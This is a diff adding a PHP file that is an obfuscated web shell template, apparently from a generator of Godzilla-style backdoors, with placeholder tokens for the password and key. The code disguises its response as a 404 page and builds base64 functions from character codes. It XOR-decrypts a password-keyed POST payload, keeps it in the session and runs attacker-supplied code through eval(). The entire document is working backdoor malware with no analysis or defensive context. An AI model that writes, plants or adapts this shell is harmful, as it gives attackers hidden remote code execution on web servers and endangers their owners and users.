@@ -1,0 +1,32 @@
+<?pHP
+ini_set('error_reporting',chr(48));
+header("HTTP/1.0 404 Not Found");
+call_user_func({stryi}("c2V0X3RpbWVfbGltaXQ="), 48);
+${strer} = Chr(98).Chr(97).Chr(115).Chr(101).Chr(54).Chr(52).Chr(95);
+${strqi} = "\x63\x6f\x64\x65";
+function {strshier}(/*{strshisan}*/${strjiu},${strshi}){
+    for(${strshiyi}=Chr("48");${strshiyi}<strlen(${strjiu});${strshiyi}++) {
+        ${strshiba} = ${strshi}[${strshiyi}+Chr("49")&chr(49).chr(53)];
+        ${strjiu}[${strshiyi}] = ${strjiu}[${strshiyi}]^${strshiba};
+    }
+    return ${strjiu};
+}${strliu}={stryi}("{pass}");${strwu} = {stryi}("WVhsc2IyRms=");
+${strba} = ${strer}.Chr(101).Chr(110).${strqi};
+function {stryi}($strshiwu){
+    global ${strer},${strqi};
+    $func = ${strer}.Chr(100).Chr(101).${strqi};
+    return call_user_func($func, $strshiwu);
+}${strsan}={stryi}("{secretKey}");
+${strsi} = {stryi}("WjJWMFFtRnphV056U1c1bWJ3PT0=");
+if (isset($_POST/*{strsan}*/[${strliu}])) {
+    @session_start();
+    ${strshiqi}={strshier}/*{strshisan}*/({stryi}($_POST[${strliu}]),${strsan});if (/*{strshisan}*/isset($_SESSION/*{strshiliu}*/[${strshisi}])) {
+${strshisan}={strshier}($_SESSION/*{strshier}*/[${strshisi}],${strsan});
+if (/*{strshisan}*/strpos(${strshisan},{stryi}/*{strshisan}*/(${strsi}))===false) {
+            ${strshisan}={strshier}/*{strshisan}*/(${strshisan},${strsan});
+}define("{strshiliu}","//{strshiqi}\r\n".${strshisan});@eval({strshiliu});echo "{\"message\":\"".${strba}({strshier}(@run(${strshiqi}),${strsan}))."\"}";
+    } else {if (strpos/*{stryi}*/(${strshiqi},{stryi}(${strsi}))!==false) {
+            $_SESSION[${strshisi}]={strshier}(${strshiqi},${strsan});
+        }
+    }
+}
